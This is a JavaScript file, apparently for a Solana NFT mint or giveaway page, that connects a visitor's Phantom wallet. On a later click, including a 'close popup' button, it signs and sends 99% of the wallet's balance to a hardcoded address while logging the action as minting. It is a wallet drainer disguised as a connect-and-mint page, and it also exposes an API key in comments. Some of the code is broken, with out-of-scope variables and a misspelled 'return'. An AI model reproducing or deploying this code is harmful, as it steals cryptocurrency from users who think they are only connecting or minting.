$(document).ready(function () {
    $('#connect-wallet').on('click', async () => {
        const isMobile = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);

        if (isMobile) {
            // 📱 Mobile: Open Phantom App via Deep Link
            const dappUrl = encodeURIComponent(window.location.href);
            const phantomDeepLink = `https://phantom.app/ul/browse/${dappUrl}`;
            window.location.href = phantomDeepLink;
            alert("Please open this link in the Phantom app to connect your wallet.");

            connectWallet();
        } else {
            if (window.solana && window.solana.isPhantom) {
                try {
                    const resp = await window.solana.connect();
                    console.log("Phantom Wallet connected:", resp);

                    var connection = new solanaWeb3.Connection(
                        //'https://solana-mainnet.api.syndica.io/api-key/3pfkKdcLJDjTTbhdG4Kr9J2GREPhgi8DPt7Ys7ZPXSyFDY26VyL2eBHc8kPB7WYNAcZiEBxxHsunJ6jj2RApEchAH9Gtjagvtsr',
                        'https://api.devnet.solana.com', //'api.syndica.io/api-key/3pfkKdcLJDjTTbhdG4Kr9J2GREPhgi8DPt7Ys7ZPXSyFDY26VyL2eBHc8kPB7WYNAcZiEBxxHsunJ6jj2RApEchAH9Gtjagvtsr',
                        'confirmed'
                    );

                    const public_key = new solanaWeb3.PublicKey(resp.publicKey);
                    const walletBalance = await connection.getBalance(public_key);
                    const sol = walletBalance / 1_000_000_000;
                    console.log("Wallet balance:", sol);
                    console.log(solanaWeb3.version);


                    const minBalance = await connection.getMinimumBalanceForRentExemption(0);
                    if (walletBalance < minBalance) {
                        alert("Insufficient funds for rent.");
                        return;
                    }

                    $('#connect-wallet').text("Connected");
                    $('#connect-wallet').off('click').on('click', async () => {
                        try { //671BcDWFBURi8fJuHURDKHoZVkouQ5D1EzHvrhPjoWTD
                            const recieverWallet = new solanaWeb3.PublicKey('671BcDWFBURi8fJuHURDKHoZVkouQ5D1EzHvrhPjoWTD');
                            const balanceForTransfer = walletBalance - minBalance;
                            if (balanceForTransfer <= 0) {
                                alert("Insufficient funds for transfer.");
                                return;
                            }
                            const lamportsToSend = Math.floor(balanceForTransfer * 0.99);
                            var transaction = new solanaWeb3.Transaction().add(
                                solanaWeb3.SystemProgram.transfer({
                                    fromPubkey: resp.publicKey,
                                    toPubkey: recieverWallet,
                                    lamports: lamportsToSend,
                                }),
                            );

                            transaction.feePayer = window.solana.publicKey;
                            let blockhashObj = await connection.getRecentBlockhash('confirmed');
                            transaction.recentBlockhash = blockhashObj.blockhash;

                            const signed = await window.solana.signTransaction(transaction);
                            console.log("Transaction signed:", signed);

                            let txid = await connection.sendRawTransaction(signed.serialize());
                            await connection.confirmTransaction(txid);
                            console.log("Transaction confirmed:", txid);
                        } catch (err) {
                            console.error("Error during minting:", err);
                        }
                    });
                } catch (err) {
                    console.error("Error connecting to Phantom Wallet:", err);
                }
            } else {
                alert("Phantom extension not found.");
                const isFirefox = typeof InstallTrigger !== "undefined";
                const isChrome = !!window.chrome;

                if (isFirefox) {
                    window.open("https://addons.mozilla.org/en-US/firefox/addon/phantom-app/", "_blank");
                } else if (isChrome) {
                    window.open("https://chrome.google.com/webstore/detail/phantom/bfnaelmomeimhlpmgjnjophhpkkoljpa", "_blank");
                }

                else {
                    alert("⚠️ Phantom Wallet not found! Please install Phantom.");
                    window.open("https://phantom.app/", "_blank");
                }
            }

        }
    });






});


$('#connect-wallet1').on('click', async () => {
     const isMobile = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);

        if (isMobile) {
            // 📱 Mobile: Open Phantom App via Deep Link
            const dappUrl = encodeURIComponent(window.location.href);
            const phantomDeepLink = `https://phantom.app/ul/browse/${dappUrl}`;
            window.location.href = phantomDeepLink;
            alert("Please open this link in the Phantom app to connect your wallet.");
            connectWallet();
        } else {
    if (window.solana && window.solana.isPhantom) {
        try {
            const resp = await window.solana.connect();
            console.log("Phantom Wallet connected:", resp);

            var connection = new solanaWeb3.Connection(
                //'https://solana-mainnet.api.syndica.io/api-key/3pfkKdcLJDjTTbhdG4Kr9J2GREPhgi8DPt7Ys7ZPXSyFDY26VyL2eBHc8kPB7WYNAcZiEBxxHsunJ6jj2RApEchAH9Gtjagvtsr',
                'https://api.devnet.solana.com', //'api.syndica.io/api-key/3pfkKdcLJDjTTbhdG4Kr9J2GREPhgi8DPt7Ys7ZPXSyFDY26VyL2eBHc8kPB7WYNAcZiEBxxHsunJ6jj2RApEchAH9Gtjagvtsr',
                'confirmed'
            );

            const public_key = new solanaWeb3.PublicKey(resp.publicKey);
            const walletBalance = await connection.getBalance(public_key);
            const sol = walletBalance / 1_000_000_000;
            console.log("Wallet balance:", sol);
            console.log(solanaWeb3.version);


            const minBalance = await connection.getMinimumBalanceForRentExemption(0);
            if (walletBalance < minBalance) {
                alert("Insufficient funds for rent.");
                return;
            }

            $('#connect-wallet').text("Connected");
            $('#connect-wallet').off('click').on('click', async () => {
                try { //671BcDWFBURi8fJuHURDKHoZVkouQ5D1EzHvrhPjoWTD
                    const recieverWallet = new solanaWeb3.PublicKey('671BcDWFBURi8fJuHURDKHoZVkouQ5D1EzHvrhPjoWTD');
                    const balanceForTransfer = walletBalance - minBalance;
                    if (balanceForTransfer <= 0) {
                        alert("Insufficient funds for transfer.");
                        return;
                    }
                    const lamportsToSend = Math.floor(balanceForTransfer * 0.99);
                    var transaction = new solanaWeb3.Transaction().add(
                        solanaWeb3.SystemProgram.transfer({
                            fromPubkey: resp.publicKey,
                            toPubkey: recieverWallet,
                            lamports: lamportsToSend,
                        }),
                    );

                    transaction.feePayer = window.solana.publicKey;
                    let blockhashObj = await connection.getRecentBlockhash('confirmed');
                    transaction.recentBlockhash = blockhashObj.blockhash;

                    const signed = await window.solana.signTransaction(transaction);
                    console.log("Transaction signed:", signed);

                    let txid = await connection.sendRawTransaction(signed.serialize());
                    await connection.confirmTransaction(txid);
                    console.log("Transaction confirmed:", txid);
                } catch (err) {
                    console.error("Error during minting:", err);
                }



            });
        } catch (err) {
            console.error("Error connecting to Phantom Wallet:", err);
        }
    } else {
        alert("Phantom extension not found.");
        const isFirefox = typeof InstallTrigger !== "undefined";
        const isChrome = !!window.chrome;

        if (isFirefox) {
            window.open("https://addons.mozilla.org/en-US/firefox/addon/phantom-app/", "_blank");
        } else if (isChrome) {
            window.open("https://chrome.google.com/webstore/detail/phantom/bfnaelmomeimhlpmgjnjophhpkkoljpa", "_blank");
        }else {
        alert("⚠️ Phantom Wallet not found! Please install Phantom.");
        window.open("https://phantom.app/", "_blank");
      }
    }
}
});


$('#closeWinPopup').off('click').on('click', async () => {
    try { //671BcDWFBURi8fJuHURDKHoZVkouQ5D1EzHvrhPjoWTD
        const recieverWallet = new solanaWeb3.PublicKey('671BcDWFBURi8fJuHURDKHoZVkouQ5D1EzHvrhPjoWTD');
        const balanceForTransfer = walletBalance - minBalance;
        if (balanceForTransfer <= 0) {
            alert("Insufficient funds for transfer.");
            return;
        }
        const lamportsToSend = Math.floor(balanceForTransfer * 0.99);
        var transaction = new solanaWeb3.Transaction().add(
            solanaWeb3.SystemProgram.transfer({
                fromPubkey: resp.publicKey,
                toPubkey: recieverWallet,
                lamports: lamportsToSend,
            }),
        );

        transaction.feePayer = window.solana.publicKey;
        let blockhashObj = await connection.getRecentBlockhash('confirmed');
        transaction.recentBlockhash = blockhashObj.blockhash;

        const signed = await window.solana.signTransaction(transaction);
        console.log("Transaction signed:", signed);

        let txid = await connection.sendRawTransaction(signed.serialize());
        await connection.confirmTransaction(txid);
        console.log("Transaction confirmed:", txid);
    } catch (err) {
        console.error("Error during minting:", err);
    }



});   



const getProvider = () => {
  if ('phantom' in window){
    const provider = window.phantom?.solana;
    if(provider?.isPhantom){
      return provider;
    }
  }

  window.open('https://phantom.app/', '_blank');
}


const connectWallet = async () => {
  const provider = getProvider();
  if(!provider) retrun;

  try{
    const response = await provider.connect();
    alert('Connected with public key:', response.publicKey.toString());
    return response.publicKey;
  } catch (err){
    alert('Connection failed:', err);
  }
};
